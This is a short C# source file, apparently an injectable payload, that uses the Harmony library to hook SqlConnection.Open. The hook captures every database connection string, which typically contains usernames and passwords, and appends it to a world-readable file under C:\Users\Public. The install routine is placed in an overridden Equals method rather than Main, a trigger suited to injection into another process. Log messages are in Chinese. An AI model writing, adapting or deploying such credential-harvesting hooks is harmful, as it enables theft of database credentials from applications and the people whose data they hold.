using System;
using System.Collections.Generic;
using System.Data.SqlClient;
using System.Linq;
using System.Reflection;
using System.Text;
using HarmonyLib;
using System.Threading.Tasks;

namespace HarmonyHook
{
    internal class Program
    {
        public override bool Equals(object obj)
        {
            run();
            return true;
        }
        static void run()
        {
            try
            {
                Harmony harmony = new Harmony("com.example.patch");
                // 获取目标方法
                Type targetType = typeof(System.Data.SqlClient.SqlConnection);
                MethodInfo targetMethod = targetType.GetMethod("Open", BindingFlags.Public | BindingFlags.Instance);

                if (targetMethod == null)
                {
                    LogToFile("目标方法 SqlConnection.Open 未找到");
                    return;
                }

                MethodInfo prefixMethod = typeof(Program).GetMethod("Prefix");

                harmony.Patch(targetMethod, new HarmonyMethod(prefixMethod));

                LogToFile("钩子安装成功");
            }
            catch (Exception ex)
            {
                LogToFile($"安装钩子失败: {ex.Message}");
            }


        }
        static void Main(string[] args)
        {

        }
        public static void Prefix(SqlConnection __instance)
        {
            string connectionString = __instance.ConnectionString;

            LogToFile($"连接字符串: {connectionString}");
        }


        private static void LogToFile(string message)
        {
            string path = @"C:\Users\Public\hook.txt";
            using (System.IO.StreamWriter sw = new System.IO.StreamWriter(path, true))
            {
                sw.WriteLine(message);
            }
        }
    }
}
